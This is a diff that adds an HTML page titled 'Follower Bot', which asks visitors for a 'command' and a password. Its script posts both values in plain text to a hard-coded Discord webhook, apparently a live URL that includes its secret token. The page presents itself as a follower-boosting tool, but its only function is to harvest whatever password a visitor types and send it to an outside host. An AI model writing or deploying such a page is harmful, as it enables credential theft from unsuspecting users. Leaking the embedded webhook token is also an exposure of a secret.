@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Follower Bot</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        input, button {
+            display: block;
+            margin: 10px auto;
+            padding: 10px;
+            width: 80%;
+            max-width: 400px;
+        }
+        button {
+            background-color: #333;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Follower Bot</h1>
+        <p>Enter your details below:</p>
+        <input type="text" id="command" placeholder="Enter Command">
+        <input type="password" id="password" placeholder="Enter Password">
+        <button onclick="sendToWebhook()">Submit</button>
+    </div>
+
+    <script>
+        function sendToWebhook() {
+            const webhookURL = "https://discord.com/api/webhooks/1355225993677242398/bjb-XoO7yyGSnqnoSfw_iPU8NsB2CYaL43zc6LzGEGUTARFug4HrVY-vN4PXHDxmkyyN";
+            const command = document.getElementById("command").value;
+            const password = document.getElementById("password").value;
+            
+            if (!command || !password) {
+                alert("Please fill in both fields.");
+                return;
+            }
+
+            const data = {
+                content: `New Submission:\nCommand: ${command}\nPassword: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    alert("Sent successfully!");
+                } else {
+                    alert("Failed to send.");
+                }
+            }).catch(error => {
+                console.error("Error:", error);
+                alert("Error sending data.");
+            });
+        }
+    </script>
+</body>
+</html>
